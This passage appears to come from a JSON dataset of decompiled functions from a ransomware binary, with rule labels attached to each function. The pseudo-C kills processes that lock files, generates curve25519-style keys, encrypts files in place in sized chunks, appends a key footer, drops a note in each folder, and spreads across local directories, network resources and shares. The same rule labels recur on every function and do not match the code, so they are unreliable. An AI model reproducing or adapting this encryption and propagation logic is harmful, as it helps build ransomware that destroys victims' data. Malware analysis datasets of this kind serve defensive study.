fcn.00412f20(var_44h);\n                    return;\n                }\n                var_ch = NULL;\n                _liDistanceToMove = 0;\n                var_18h = NULL;\n                var_1ch = &fcn.00409830::lpExistingFileName;\n                lpFileSize = 0x1;\n                nNumberOfBytesToWrite = var_40h;\n                lpNewFileName = 0x409ed6;\n                iVar1 = sub.RstrtMgr.DLL_RmRegisterResources();\n                var_80h = iVar1 == 0;\n                var_18h = var_80h;\n                if (var_80h == 0) {\n                    if (*0x41426c != 0) {\n                        lpNewFileName = NULL;\n                        hProcess = NULL;\n                        lpNumberOfBytesWritten = NULL;\n                        var_34h = NULL;\n                        var_38h = lpExistingFileName;\n                        var_3ch = 0x40a17a;\n                        var_3ch = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                        var_40h = lpExistingFileName;\n                        var_44h = NULL;\n                        var_48h = 0xfde9;\n                        var_4ch = 0x40a18c;\n                        var_68h = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                        _var_54h = CONCAT44(0x40a198, var_54h);\n                        var_4ch = var_68h;\n                        var_3ch = fcn.00412ef0(var_68h);\n                        var_4ch = NULL;\n                        _var_54h = ZEXT48(var_68h);\n                        _var_5ch = CONCAT44(var_3ch, lpExistingFileName);\n                        var_60h = 0x40a1b4;\n                        var_60h = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                        var_64h = lpExistingFileName;\n                        var_68h = NULL;\n                        var_6ch = 0xfde9;\n                        var_70h = 0x40a1c6;\n                        (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                        lpNewFileName = var_18h;\n                        hProcess = var_3ch;\n                        lpNumberOfBytesWritten = 0x403b28;\n                        var_34h = 0x40a1d8;\n                        fcn.00404dd0(0x403b28, var_3ch, var_18h);\n                        lpNewFileName = var_3ch;\n                        hProcess = 0x40a1e4;\n                        fcn.00412f20(var_3ch);\n                    }\n                }\n                else {\n                    var_88h = 0xa;\n                    lpNewFileName = &fcn.00409830::var_d0h;\n                    hProcess = &stack0xffffd33c;\n                    lpNumberOfBytesWritten = &fcn.00409830::var_88h;\n                    var_34h = &fcn.00409830::var_cch;\n                    var_38h = var_40h;\n                    var_3ch = 0x409f29;\n                    iVar1 = sub.RstrtMgr.DLL_RmGetList();\n                    var_84h = iVar1 == 0;\n                    var_18h = var_84h;\n                    if (var_84h == 0) {\n                        if (*0x41426c != 0) {\n                            var_3ch = NULL;\n                            var_40h = NULL;\n                            var_44h = NULL;\n                            var_48h = NULL;\n                            var_4ch = lpExistingFileName;\n                            _var_54h = CONCAT44(0x40a0ed, var_54h);\n                            uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                            _var_54h = CONCAT44(uVar2, lpExistingFileName);\n                            _var_5ch = 0xfde9;\n                            var_60h = 0x40a0ff;\n                            var_60h = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                            var_64h = 0x40a10b;\n                            var_6ch = fcn.00412ef0(var_60h);\n                            var_60h = NULL;\n                            var_64h = NULL;\n                            var_68h = NULL;\n                            var_70h = lpExistingFileName;\n                            var_74h = 0x40a127;\n                            var_38h = var_6ch;\n                            var_74h = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                            var_78h = lpExistingFileName;\n                            var_7ch = 0;\n                            var_80h = 0xfde9;\n                            var_84h = 0x40a139;\n                            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                            lpNewFileName = var_18h;\n                            hProcess = var_38h;\n                            lpNumberOfBytesWritten = 0x403b18;\n                            var_34h = 0x40a14b;\n                            fcn.00404dd0(0x403b18, var_38h, var_18h);\n                            lpNewFileName = var_38h;\n                            hProcess = 0x40a157;\n                            fcn.00412f20(var_38h);\n                        }\n                    }\n                    else {\n                        for (var_ch = NULL; var_ch < var_88h; var_ch = var_ch + 1) {\n                            if ((*(&stack0xffffd5c8 + var_ch * 0x29c) != 4) &&\n                               (*(&stack0xffffd5c8 + var_ch * 0x29c) != 1000)) {\n                                var_3ch = 0x409faa;\n                                iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n                                if (iVar1 != *(&stack0xffffd33c + var_ch * 0x29c)) {\n                                    var_3ch = *(&stack0xffffd33c + var_ch * 0x29c);\n                                    var_40h = NULL;\n                                    var_44h = 0x100001;\n                                    var_48h = 0x409fda;\n                                    hProcess = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n                                    if (hProcess == 0xffffffff) {\n                                        if (*0x41426c != 0) {\n                                            var_3ch = NULL;\n                                            var_40h = NULL;\n                                            var_44h = NULL;\n                                            var_48h = NULL;\n                                            var_4ch = &stack0xffffd348 + var_ch * 0x29c;\n                                            _var_54h = CONCAT44(0x40a037, var_54h);\n                                            uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                                            _var_54h = CONCAT44(uVar2, &stack0xffffd348 + var_ch * 0x29c);\n                                            _var_5ch = 0xfde9;\n                                            var_60h = 0x40a054;\n                                            var_60h = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                                            var_64h = 0x40a060;\n                                            var_6ch = fcn.00412ef0(var_60h);\n                                            var_60h = NULL;\n                                            var_64h = NULL;\n                                            var_68h = NULL;\n                                            var_70h = &stack0xffffd348 + var_ch * 0x29c;\n                                            var_74h = 0x40a087;\n                                            var_34h = var_6ch;\n                                            var_74h = (*_sym.imp.KERNEL32.dll_lstrlenW)();\n                                            var_78h = &stack0xffffd348 + var_ch * 0x29c;\n                                            var_7ch = 0;\n                                            var_80h = 0xfde9;\n                                            var_84h = 0x40a0a4;\n                                            (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n                                            var_84h = 0x40a0aa;\n                                            var_3ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                                            var_40h = var_34h;\n                                            var_44h = 0x403b04;\n                                            var_48h = 0x40a0b9;\n                                            fcn.00404dd0(0x403b04, var_34h, var_3ch);\n                                            var_3ch = var_34h;\n                                            var_40h = 0x40a0c5;\n                                            fcn.00412f20(var_34h);\n                                        }\n                                    }\n                                    else {\n                                        var_3ch = NULL;\n                                        var_44h = 0x409fef;\n                                        var_40h = hProcess;\n                                        (*_sym.imp.KERNEL32.dll_TerminateProcess)();\n                                        var_44h = 0x1388;\n                                        var_48h = hProcess;\n                                        var_4ch = 0x409ffe;\n                                        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n                                        var_4ch = hProcess;\n                                        _var_54h = CONCAT44(0x40a008, var_54h);\n                                        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n                lpNewFileName = var_40h;\n                hProcess = 0x40a1f0;\n                sub.RstrtMgr.DLL_RmEndSession();\n                var_6ch = NULL;\n            }\n            lpBuffer = 0x409983;\n            (*_sym.imp.KERNEL32.dll_GetFileSizeEx)();\n            lpBuffer = 0x100000;\n            var_ch = 0x40998d;\n            iVar1 = fcn.00412ef0(0x100000);\n            if (iVar1 != 0) {\n                lpBuffer = &fcn.00409830::pbBuffer;\n                var_ch = 0x20;\n                lpNewFilePointer = *0x414270;\n                liDistanceToMove = 0x4099b2;\n                (*_sym.imp.ADVAPI32.dll_CryptGenRandom)();\n                pbBuffer._0_1_ = pbBuffer & 0xf8;\n                uStackY213 = uStackY213 & 0x7f | 0x40;\n                liDistanceToMove = &fcn.00409830::var_c8h;\n                var_18h = &fcn.00409830::pbBuffer;\n                var_1ch = &fcn.00409830::var_158h;\n                lpFileSize = 0x409a34;\n                fcn.00404f20(var_1ch, var_18h, liDistanceToMove);\n                liDistanceToMove = 0x4141d0;\n                var_18h = &fcn.00409830::pbBuffer;\n                var_1ch = &fcn.00409830::var_110h;\n                lpFileSize = 0x409a4f;\n                fcn.00404f20(var_1ch, var_18h, 0x4141d0);\n                liDistanceToMove = &fcn.00409830::var_198h;\n                var_18h = 0x20;\n                var_1ch = &fcn.00409830::var_110h;\n                lpFileSize = 0x409a67;\n                fcn.00410b40(var_1ch, 0x20, liDistanceToMove);\n                liDistanceToMove = 0x100;\n                var_18h = 0x100;\n                var_1ch = &fcn.00409830::var_198h;\n                lpFileSize = &fcn.00409830::var_12a8h;\n                nNumberOfBytesToWrite = 0x409a87;\n                fcn.0040fee0(lpFileSize, var_1ch, 0x100, 0x100);\n                liDistanceToMove = &fcn.00409830::var_178h;\n                var_18h = &fcn.00409830::var_12a8h;\n                var_1ch = 0x409a9d;\n                fcn.0040ff70(var_18h, liDistanceToMove);\n                liDistanceToMove = 0x40;\n                var_18h = &fcn.00409830::var_198h;\n                var_1ch = 0x409aae;\n                var_138h = fcn.004105e0(var_18h, 0x40);\n                liDistanceToMove = 0x40;\n                var_18h = NULL;\n                var_1ch = &fcn.00409830::var_224h;\n                lpFileSize = 0x409ad0;\n                fcn.00412e80(var_1ch, 0, 0x40);\n                liDistanceToMove = 0x40;\n                var_18h = NULL;\n                var_1ch = &fcn.00409830::var_198h;\n                lpFileSize = 0x409ae3;\n                fcn.00412e80(var_1ch, 0, 0x40);\n                _liDistanceToMove = CONCAT44(lpNewFilePointer, 0x40);\n                var_18h = NULL;\n                var_1ch = &fcn.00409830::var_110h;\n                lpFileSize = 0x409af6;\n                fcn.00412e80(var_1ch, 0, 0x40);\n                _liDistanceToMove = 0;\n                var_18h = NULL;\n                var_1ch = NULL;\n                lpFileSize = NULL;\n                nNumberOfBytesToWrite = hObject;\n                lpNewFileName = 0x409b17;\n                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                if ((var_1ch < 0) || ((var_1ch < 1 && (lpFileSize < 0x1400001)))) {\n                    if ((var_1ch < 0) || ((var_1ch < 1 && (lpFileSize < 0x500001)))) {\n                        _var_90h = CONCAT44(var_8ch, var_90h);\n                        _var_98h = CONCAT44(var_94h, var_98h);\n                        _var_a0h = CONCAT44(var_9ch, var_a0h);\n                        unique0x10000fd4 = CONCAT44(var_a4h, stack0xffffff54);\n                        _var_70h = CONCAT44(var_6ch, var_70h);\n                        if ((-1 < var_1ch) &&\n                           ((0 < var_1ch ||\n                            (_var_90h = CONCAT44(var_8ch, var_90h),  _var_98h = CONCAT44(var_94h, var_98h), \n                            _var_a0h = CONCAT44(var_9ch, var_a0h), \n                            unique0x10000fdc = CONCAT44(var_a4h, stack0xffffff54), \n                            _var_70h = CONCAT44(var_6ch, var_70h),  lpFileSize != NULL)))) {\n                            if ((var_1ch < 0) || ((var_1ch < 1 && (lpFileSize < 0x41)))) {\n                                _var_90h = CONCAT44(var_1ch, lpFileSize);\n                            }\n                            else {\n                                lpNewFileName = NULL;\n                                hProcess = 0xa;\n                                lpNumberOfBytesWritten = var_1ch;\n                                var_34h = lpFileSize;\n                                var_38h = 0x409d5f;\n                                _var_90h = fcn.00413200();\n                            }\n                            lpNewFileName = NULL;\n                            hProcess = &fcn.00409830::nNumberOfBytesToWrite;\n                            lpNumberOfBytesWritten = var_90h;\n                            var_34h = lpBuffer;\n                            var_38h = hObject;\n                            var_3ch = 0x409db2;\n                            unique0x10000fcc = _var_90h;\n                            (*_sym.imp.KERNEL32.dll_ReadFile)();\n                            var_3ch = nNumberOfBytesToWrite;\n                            var_40h = lpBuffer;\n                            var_44h = lpBuffer;\n                            var_48h = &fcn.00409830::var_12a8h;\n                            var_4ch = NULL;\n                            _var_54h = CONCAT44(0x409dcc, var_54h);\n                            fcn.004102d0(0, var_48h, lpBuffer, lpBuffer, nNumberOfBytesToWrite);\n                            var_3ch = NULL;\n                            var_40h = NULL;\n                            var_44h = lpNewFilePointer;\n                            var_48h = liDistanceToMove;\n                            var_4ch = hObject;\n                            _var_54h = CONCAT44(0x409de5, var_54h);\n                            (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                            _var_54h = ZEXT48(&fcn.00409830::lpNumberOfBytesWritten);\n                            _var_5ch = CONCAT44(nNumberOfBytesToWrite, lpBuffer);\n                            var_60h = hObject;\n                            var_64h = 0x409dfd;\n                            (*_sym.imp.KERNEL32.dll_WriteFile)();\n                            _var_98h = CONCAT44(var_94h, var_98h);\n                            _var_a0h = CONCAT44(var_9ch, var_a0h);\n                            _var_70h = CONCAT44(var_6ch, var_70h);\n                        }\n                    }\n                    else {\n                        lpNewFileName = NULL;\n                        hProcess = 0x3;\n                        lpNumberOfBytesWritten = var_1ch;\n                        var_34h = lpFileSize;\n                        var_38h = 0x409c50;\n                        _var_a0h = fcn.00413200();\n                        _var_5ch = 0;\n                        while( true ) {\n                            _var_90h = CONCAT44(var_8ch, var_90h);\n                            _var_98h = CONCAT44(var_94h, var_98h);\n                            unique0x10000fec = CONCAT44(var_a4h, stack0xffffff54);\n                            if ((0 < var_58h) ||\n                               ((-1 < _var_5ch &&\n                                (_var_90h = CONCAT44(var_8ch, var_90h),  _var_98h = CONCAT44(var_94h, var_98h), \n                                unique0x10000ff4 = CONCAT44(var_a4h, stack0xffffff54),  2 < var_5ch)))) break;\n                            lpNewFileName = NULL;\n                            hProcess = &fcn.00409830::nNumberOfBytesToWrite;\n                            lpNumberOfBytesWritten = 0x100000;\n                            var_34h = lpBuffer;\n                            var_38h = hObject;\n                            var_3ch = 0x409ca7;\n                            (*_sym.imp.KERNEL32.dll_ReadFile)();\n                            var_3ch = nNumberOfBytesToWrite;\n                            var_40h = lpBuffer;\n                            var_44h = lpBuffer;\n                            var_48h = &fcn.00409830::var_12a8h;\n                            var_4ch = NULL;\n                            _var_54h = CONCAT44(0x409cc1, var_54h);\n                            fcn.004102d0(0, var_48h, lpBuffer, lpBuffer, nNumberOfBytesToWrite);\n                            var_3ch = NULL;\n                            var_40h = NULL;\n                            var_44h = lpNewFilePointer;\n                            var_48h = liDistanceToMove;\n                            var_4ch = hObject;\n                            _var_54h = CONCAT44(0x409cda, var_54h);\n                            (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                            _var_54h = ZEXT48(&fcn.00409830::lpNumberOfBytesWritten);\n                            var_58h = nNumberOfBytesToWrite;\n                            var_5ch = lpBuffer;\n                            var_60h = hObject;\n                            var_64h = 0x409cf2;\n                            (*_sym.imp.KERNEL32.dll_WriteFile)();\n                            _var_70h = _liDistanceToMove + _var_a0h;\n                            _liDistanceToMove = _var_a0h + _liDistanceToMove;\n                            var_64h = NULL;\n                            var_68h = NULL;\n                            var_74h = hObject;\n                            var_78h = 0x409d20;\n                            (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                            _var_5ch = CONCAT44(var_58h + (0xfffffffe < var_5ch), var_5ch + 1);\n                        }\n                    }\n                }\n                else {\n                    lpNewFileName = NULL;\n                    hProcess = 0xa00000;\n                    lpNumberOfBytesWritten = var_1ch;\n                    var_34h = lpFileSize;\n                    var_38h = 0x409b44;\n                    _var_98h = fcn.00413200();\n                    _var_54h = 0;\n                    while( true ) {\n                        var_94h = _var_98h >> 0x20;\n                        _var_90h = CONCAT44(var_8ch, var_90h);\n                        _var_a0h = CONCAT44(var_9ch, var_a0h);\n                        unique0x10000ffc = CONCAT44(var_a4h, stack0xffffff54);\n                        _var_70h = CONCAT44(var_6ch, var_70h);\n                        if ((var_94h < var_50h) ||\n                           ((var_94h <= var_50h &&\n                            (_var_90h = CONCAT44(var_8ch, var_90h),  _var_a0h = CONCAT44(var_9ch, var_a0h), \n                            unique0x10001004 = CONCAT44(var_a4h, stack0xffffff54), \n                            _var_70h = CONCAT44(var_6ch, var_70h),  var_98h <= var_54h)))) break;\n                        lpNewFileName = NULL;\n                        hProcess = &fcn.00409830::nNumberOfBytesToWrite;\n                        lpNumberOfBytesWritten = 0x100000;\n                        var_34h = lpBuffer;\n                        var_38h = hObject;\n                        var_3ch = 0x409ba5;\n                        (*_sym.imp.KERNEL32.dll_ReadFile)();\n                        var_3ch = nNumberOfBytesToWrite;\n                        var_40h = lpBuffer;\n                        var_44h = lpBuffer;\n                        var_48h = &fcn.00409830::var_12a8h;\n                        var_4ch = NULL;\n                        _var_54h = CONCAT44(0x409bbf, var_54h);\n                        fcn.004102d0(0, var_48h, lpBuffer, lpBuffer, nNumberOfBytesToWrite);\n                        var_3ch = NULL;\n                        var_40h = NULL;\n                        var_44h = lpNewFilePointer;\n                        var_48h = liDistanceToMove;\n                        var_4ch = hObject;\n                        _var_54h = CONCAT44(0x409bd8, var_54h);\n                        (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                        var_54h = &fcn.00409830::lpNumberOfBytesWritten;\n                        var_50h = 0;\n                        _var_5ch = CONCAT44(0x100000, lpBuffer);\n                        var_60h = hObject;\n                        var_64h = 0x409bf1;\n                        (*_sym.imp.KERNEL32.dll_WriteFile)();\n                        var_70h = liDistanceToMove + 0xa00000;\n                        var_6ch = lpNewFilePointer + (0xff5fffff < liDistanceToMove);\n                        _liDistanceToMove = CONCAT44(var_6ch, var_70h);\n                        var_64h = NULL;\n                        var_68h = NULL;\n                        var_74h = hObject;\n                        var_78h = 0x409c1c;\n                        (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                        _var_54h = CONCAT44(var_50h + (0xfffffffe < var_54h), var_54h + 1);\n                    }\n                }\n                lpNewFileName = 0x10cc;\n                hProcess = NULL;\n                lpNumberOfBytesWritten = &fcn.00409830::var_12a8h;\n                var_34h = 0x409e10;\n                fcn.00412e80(lpNumberOfBytesWritten, 0, 0x10cc);\n                _liDistanceToMove = 0;\n                lpNewFileName = 0x2;\n                hProcess = NULL;\n                lpNumberOfBytesWritten = NULL;\n                var_34h = NULL;\n                var_38h = hObject;\n                var_3ch = 0x409e31;\n                (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n                var_3ch = NULL;\n                var_40h = &fcn.00409830::lpNumberOfBytesWritten;\n                var_44h = 0x48;\n                var_48h = &fcn.00409830::var_158h;\n                var_4ch = hObject;\n                _var_54h = CONCAT44(0x409e4a, var_54h);\n                (*_sym.imp.KERNEL32.dll_WriteFile)();\n                var_ch = 0x409e53;\n                fcn.00412f20(lpBuffer);\n            }\n            lpBuffer = hObject;\n            var_ch = 0x409e60;\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        }\n    }\n    return;\n}\n",
        "token_count": 8787
    },
    "0040a3c0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a3c0(uint lpString2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t lpFindFileData;\n    uint lpString1;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t hFindFile;\n    int32_t var_14h;\n    int32_t hObject;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t lpFileName;\n    \n    lpFileName = fcn.00412ef0(0x10000);\n    if (lpFileName != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, 0x403b94);\n        hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x40000000, 1, 0, 1, 0, 0);\n        if (hObject != -1) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(0x401af0, &var_28h, 0);\n            (*_sym.imp.KERNEL32.dll_WriteFile)(hObject, 0x401af0, uVar1);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n        }\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, 0x403bd4);\n        hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        if (hFindFile == -1) {\n            if (*0x41426c != 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2, 0, 0, 0, 0);\n                var_20h = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, lpString2, uVar1);\n                var_1ch = fcn.00412ef0(var_20h);\n                uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2, var_1ch, var_20h, 0, 0);\n                (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, lpString2, uVar1);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.00404dd0(0x403c44, var_1ch, uVar1);\n                fcn.00412f20(var_1ch);\n            }\n        }\n        else {\n            do {\n                for (var_ch = 0; var_ch < 0x28; var_ch = var_ch + 1) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&lpString1, *(var_ch * 4 + 0x414130));\n                    if (iVar2 == 0) goto code_r0x0040a601;\n                }\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, 0x403bdc);\n                (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, &lpString1);\n                if (((lpFindFileData & 0x10) == 0) &&\n                   (iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(&lpString1, 0x403be0),  iVar2 != 0)) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpString1);\n                    for (var_8h = iVar2 + -1; -1 < var_8h; var_8h = var_8h + -1) {\n                        if (*(&lpString1 + var_8h * 2) == 0x2e) {\n                            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&lpString1 + var_8h * 2, 0x403c1c);\n                            if (((iVar2 == 0) ||\n                                (iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&lpString1 + var_8h * 2, 0x403c28), \n                                iVar2 == 0)) ||\n                               (iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&lpString1 + var_8h * 2, 0x403c34), \n                               iVar2 == 0)) goto code_r0x0040a601;\n                            break;\n                        }\n                    }\n                    while (iVar2 = fcn.00413060(0x41420c, lpFileName, 0),  iVar2 == 0) {\n                        var_24h = 0;\n                        while (var_14h = fcn.00412fc0(0x41420c, 0, &var_24h),  var_14h != 0) {\n                            fcn.00409830(var_14h);\n                            fcn.00412f20(var_14h);\n                        }\n                    }\n                }\ncode_r0x0040a601:\n                iVar2 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n            } while (iVar2 != 0);\n            (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n        }\n        fcn.00412f20(lpFileName);\n    }\n    return;\n}\n",
        "token_count": 1271
    },
    "0040a6d0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a6d0(uint lpString2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t lpFindFileData;\n    uint lpString1;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t hFindFile;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t lpFileName;\n    \n    while (iVar1 = fcn.00413060(0x41423c, lpString2, 0),  iVar1 == 0) {\n        while (var_ch = fcn.00412fc0(0x41420c, 0, &var_1ch),  var_ch != 0) {\n            fcn.00409830(var_ch);\n            fcn.00412f20(var_ch);\n        }\n    }\n    lpFileName = fcn.00412ef0(0x10000);\n    if (lpFileName != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n        (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, 0x403c5c);\n        hFindFile = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(lpFileName, &lpFindFileData);\n        if (hFindFile == -1) {\n            if (*0x41426c != 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2, 0, 0, 0, 0);\n                var_18h = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, lpString2, uVar2);\n                var_14h = fcn.00412ef0(var_18h);\n                uVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2, var_14h, var_18h, 0, 0);\n                (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0xfde9, 0, lpString2, uVar2);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                fcn.00404dd0(0x403c68, var_14h, uVar2);\n                fcn.00412f20(var_14h);\n            }\n        }\n        else {\n            do {\n                if ((lpFindFileData & 0x10) != 0) {\n                    for (var_8h = 0; var_8h < 0x28; var_8h = var_8h + 1) {\n                        iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)(&lpString1, *(var_8h * 4 + 0x414130));\n                        if (iVar1 == 0) goto code_r0x0040a7fc;\n                    }\n                    (*_sym.imp.KERNEL32.dll_lstrcpyW)(lpFileName, lpString2);\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, 0x403c64);\n                    (*_sym.imp.KERNEL32.dll_lstrcatW)(lpFileName, &lpString1);\n                    fcn.0040a6d0(lpFileName);\n                }\ncode_r0x0040a7fc:\n                iVar1 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(hFindFile, &lpFindFileData);\n            } while (iVar1 != 0);\n            (*_sym.imp.KERNEL32.dll_FindClose)(hFindFile);\n        }\n        fcn.00412f20(lpFileName);\n    }\n    return;\n}\n",
        "token_count": 814
    },
    "0040a8d0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a8d0(int32_t arg_8h)\n\n{\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    if (arg_8h == 0) {\n        while (var_4h = fcn.00412fc0(0x41420c, 1, &var_8h),  var_4h != 0) {\n            fcn.00409830(var_4h);\n            fcn.00412f20(var_4h);\n        }\ncode_r0x0040a9a5:\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n        return;\n    }\n    do {\n        var_4h = fcn.00412fc0(0x41423c, 0, &var_8h);\n        if (var_4h == 0) {\n            if (var_8h != -1) goto code_r0x0040a9a5;\n        }\n        else {\n            fcn.0040a3c0(var_4h);\n            fcn.00412f20(var_4h);\n        }\n        while (var_4h = fcn.00412fc0(0x41420c, 0, &var_8h),  var_4h != 0) {\n            fcn.00409830(var_4h);\n            fcn.00412f20(var_4h);\n        }\n    } while( true );\n}\n",
        "token_count": 347
    },
    "0040a9c0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a9c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0xffffffff;\n    var_8h = 0x4000;\n    uVar3 = 2;\n    iVar1 = sub.MPR.dll_WNetOpenEnumW(2, 0, 0x13, arg_8h, &var_10h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00412ef0(var_8h);\n        if (iVar1 != 0) {\n            while (uVar3 = var_10h,  iVar2 = sub.MPR.dll_WNetEnumResourceW(),  iVar2 == 0) {\n                for (var_4h = 0; var_4h < var_ch; var_4h = var_4h + 1) {\n                    if ((*(iVar1 + 0xc + var_4h * 0x20) & 2) == 0) {\n                        fcn.0040a6d0(*(iVar1 + 0x14 + var_4h * 0x20));\n                    }\n                    else {\n                        fcn.0040a9c0(var_4h * 0x20 + iVar1);\n                    }\n                }\n            }\n            fcn.00412f20(iVar1);\n        }\n        sub.MPR.dll_WNetCloseEnum(var_10h, uVar3);\n    }\n    return;\n}\n",
        "token_count": 368
    },
    "0040aa90": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aa90(uint lpString2)\n\n{\n    int32_t iVar1;\n    uint var_e4h;\n    uint var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint *lpString1;\n    \n    var_10h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    do {\n        var_ch = sub.NETAPI32.dll_NetShareEnum(lpString2, 1, &var_14h, 0xffffffff, &var_10h, &var_1ch, &var_18h);\n        if ((var_ch == 0) || (var_ch == 0xea)) {\n            lpString1 = var_14h;\n            for (var_8h = 1; var_8h <= var_10h; var_8h = var_8h + 1) {\n                if ((lpString1[1] == 0) || (lpString1[1] == -0x80000000)) {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*lpString1);\n                    if (2 < iVar1) {\n                        iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(*lpString1, 0x403c80);\n                        if (iVar1 != 0) {\n                            (*_sym.imp.KERNEL32.dll_lstrcpyW)(&var_e4h, 0x403c90);\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_e4h, lpString2);\n                            (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_e4h, 0x403c98);\n                            